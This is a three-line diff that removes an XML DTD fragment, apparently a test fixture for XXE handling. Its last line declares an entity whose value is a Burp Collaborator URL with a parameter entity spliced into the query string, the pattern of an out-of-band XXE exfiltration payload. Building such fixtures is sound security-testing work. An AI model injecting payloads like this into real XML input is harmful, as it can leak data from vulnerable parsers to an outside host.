@@ -1,3 +1,0 @@
-<!ENTITY blah "blah">
-<!ENTITY % nope "nopenope">
-<!ENTITY % notxxe '<!ENTITY xxe "http://907zy5zmm007if1ugdl0h6jdd4jx7m.burpcollaborator.net/?%nope;">'>
